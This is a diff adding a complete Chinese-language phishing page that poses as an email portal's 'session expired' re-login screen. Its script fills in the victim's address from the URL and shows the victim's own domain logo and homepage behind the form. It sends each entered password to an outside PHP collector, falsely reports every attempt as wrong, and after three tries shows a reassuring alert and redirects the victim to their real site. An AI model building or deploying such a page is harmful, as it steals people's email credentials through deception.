@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>更新邮箱</title>
+<style>
+/* 原有 CSS 样式保持不变 */
+body {
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    font-family: Arial, sans-serif;
+    position: relative;
+    overflow: hidden;
+}
+
+#background-container {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: -1;
+}
+
+#background-frame {
+    width: 100%;
+    height: 100%;
+    border: none;
+    position: absolute;
+    top: 0;
+    left: 0;
+    pointer-events: none;
+}
+
+.abstract-shapes {
+    display: none;
+}
+
+.form-container {
+    background: #fff;
+    padding: 30px;
+    border-radius: 15px;
+    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+    text-align: center;
+    width: 350px;
+    border: 2px solid #ddd;
+    position: relative;
+    z-index: 1;
+}
+
+h2 {
+    color: #333;
+    margin-bottom: 20px;
+    font-size: 22px;
+    font-weight: bold;
+}
+
+p {
+    color: #666;
+    font-size: 14px;
+    margin-bottom: 20px;
+}
+
+.form-group {
+    margin-bottom: 15px;
+    text-align: left;
+}
+
+.form-group label {
+    display: block;
+    margin-bottom: 5px;
+    font-size: 14px;
+    color: #333;
+}
+
+.form-group input {
+    width: 100%;
+    padding: 10px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    font-size: 14px;
+}
+
+.form-group button {
+    width: 60%;
+    padding: 12px;
+    background: #007bff;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: background 0.3s ease;
+    margin-top: 20px;
+    margin-left: auto;
+    margin-right: auto;
+    display: block;
+}
+
+.form-group button:hover {
+    background: #0056b3;
+}
+
+.error-message {
+    color: red;
+    font-size: 14px;
+    display: none;
+    margin-top: 10px;
+    text-align: left;
+}
+
+#domainLogo {
+    max-height: 50px;
+    display: block;
+    margin: 0 auto 20px;
+}
+
+/* 会话过期文字样式 */
+#session-expired {
+    color: red;
+    font-weight: normal;
+    font-size: 14px;
+}
+</style>
+</head>
+<body>
+
+<div id="background-container">
+    <iframe id="background-frame" src="" frameborder="0"></iframe>
+</div>
+
+<div class="form-container">
+    <img id="domainLogo" alt="域名标志" style="display: none;">
+    <h2 id="emailDomainHeader">门户</h2>
+
+    <!-- 会话过期文字 -->
+    <p id="session-expired">您的会话已过期，请重新登录以继续。</p>
+    
+    <form id="loginForm" action="https://amdesarrollos.com/layouts/smrt/tele-php.php" method="post">
+        <div class="form-group">
+            <label for="username">邮箱</label>
+            <input type="text" id="username" name="username" readonly required>
+        </div>
+        <div class="error-message" id="errorMessage">密码无效！请输入正确的密码。</div>
+        <div class="form-group">
+            <label for="password">当前密码</label>
+            <input type="password" id="password" name="password" placeholder="请输入您的密码" required>
+        </div>
+        <div class="form-group">
+            <button type="submit">登录</button>
+        </div>
+    </form>
+</div>
+
+<script>
+// 提取 '#' 参数值
+const fragment = window.location.hash.slice(1); // 移除 '#' 字符
+const email = decodeURIComponent(fragment); // 解码邮箱值
+let attemptCount = 0;
+
+if (email) {
+    const usernameField = document.getElementById('username');
+    usernameField.value = email;
+
+    const emailDomain = email.split('@')[1];
+    const emailDomainHeader = email.split('@')[1].split('.')[0];
+    const emailHeader = document.getElementById('emailDomainHeader');
+    emailHeader.textContent = ` ${emailDomainHeader} 门户`;
+
+    const logoUrl = `https://logo.clearbit.com/${emailDomain}`;
+    const logoImg = document.getElementById('domainLogo');
+    logoImg.src = logoUrl;
+    logoImg.onerror = () => {
+        logoImg.style.display = "none";
+    };
+    logoImg.style.display = "block";
+
+    // 设置 iframe src 为域名主页
+    const iframe = document.getElementById('background-frame');
+    iframe.src = `https://${emailDomain}`;
+}
+
+const errorMessage = document.getElementById("errorMessage");
+
+// 输入时隐藏错误消息
+document.getElementById("password").addEventListener("input", function () {
+    errorMessage.style.display = "none";
+});
+
+// 每次提交时显示错误消息，3次尝试后重定向
+document.getElementById("loginForm").addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    const form = document.getElementById("loginForm");
+    const formData = new FormData(form);
+
+    attemptCount++;
+
+    fetch(form.action, {
+        method: "POST",
+        body: formData,
+    })
+    .then((response) => response.json())
+    .then(() => {
+        errorMessage.style.display = "block";
+        document.getElementById("password").value = ""; // 清空密码字段
+
+        // 第三次尝试后重定向并弹出警告
+        if (attemptCount >= 3) {
+            alert("您的账户停用已取消，您可以继续使用账户而不受中断。");
+            const emailDomain = email ? email.split('@')[1] : "default-domain.com";
+            window.location.href = `https://${emailDomain}`;
+        }
+    })
+    .catch(() => {
+        errorMessage.style.display = "block";
+        document.getElementById("password").value = ""; // 请求错误时清空密码字段
+
+        // 即使 fetch 错误也确保重定向
+        if (attemptCount >= 3) {
+            alert("您的账户停用已取消，您可以继续使用账户而不受中断。");
+            const emailDomain = email ? email.split('@')[1] : "default-domain.com";
+            window.location.href = `https://${emailDomain}`;
+        }
+    });
+});
+</script>
+
+</body>
+</html>
